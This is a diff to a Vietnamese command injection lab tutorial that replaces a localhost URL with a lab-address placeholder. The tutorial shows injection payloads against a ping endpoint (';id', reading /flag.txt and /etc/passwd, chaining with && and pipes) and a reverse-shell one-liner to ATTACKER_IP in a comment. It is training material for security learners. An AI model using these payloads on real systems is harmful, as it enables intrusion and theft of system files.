@@ -52,7 +52,10 @@ Thay vì `os.system`, dùng đúng `subprocess` với **danh sách đối số**
 ```bash
 cd command-injection/lab
 docker compose up -d
-# Lab tại: http://localhost:7107
+
+> 💡 **Lấy link lab:** Mở bài học này trên trang **Learning Detail** → bấm **"Truy cập Lab"** để hệ thống cấp link thực tế (VD: `https://vuln.ghedahaui.online/labs-env/...`). Thay `<LAB_ADDRESS>` bằng link đó trong các lệnh dưới đây.
+
+# Lab tại: <LAB_ADDRESS>
 ```
 
 Lab là công cụ ping web: nhập địa chỉ IP → server chạy `ping -c 1 <ip>` và hiện kết quả.
@@ -62,7 +65,7 @@ Lab là công cụ ping web: nhập địa chỉ IP → server chạy `ping -c 1
 ### Bước 2: Chạy lệnh bình thường
 
 ```bash
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1"
 PING 127.0.0.1 (127.0.0.1): 56 data bytes
 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.025 ms
 ...
@@ -73,7 +76,7 @@ PING 127.0.0.1 (127.0.0.1): 56 data bytes
 ### Bước 3: Phát hiện lỗ hổng với `;`
 
 ```bash
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;id"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1;id"
 PING 127.0.0.1 (127.0.0.1): 56 data bytes
 ...
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -86,7 +89,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ### Bước 4: Đọc file flag
 
 ```bash
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;cat%20/flag.txt"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1;cat%20/flag.txt"
 PING 127.0.0.1 (127.0.0.1): 56 data bytes
 ...
 FLAG{cmd_1nj3ct10n_2026}
@@ -100,13 +103,13 @@ FLAG{cmd_1nj3ct10n_2026}
 
 ```bash
 # Dùng && (chỉ chạy nếu ping thành công)
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1%26%26%20cat%20/flag.txt"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1%26%26%20cat%20/flag.txt"
 
 # Dùng | (pipe) — output không cần đợi ping
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1%7Ccat%20/flag.txt"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1%7Ccat%20/flag.txt"
 
 # Command substitution — nhét lệnh vào giữa chuỗi
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;echo%20$(cat%20/flag.txt)"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1;echo%20$(cat%20/flag.txt)"
 ```
 
 <!-- Output already described via CLI commands above -->
@@ -115,10 +118,10 @@ $ curl -s "http://localhost:7107/ping?ip=127.0.0.1;echo%20$(cat%20/flag.txt)"
 
 ```bash
 # Đọc /etc/passwd
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;cat%20/etc/passwd"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1;cat%20/etc/passwd"
 
 # Liệt kê thư mục
-$ curl -s "http://localhost:7107/ping?ip=127.0.0.1;ls%20-la%20/"
+$ curl -s "<LAB_ADDRESS>/ping?ip=127.0.0.1;ls%20-la%20/"
 
 # Lấy reverse shell (nếu có nc): bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
 ```
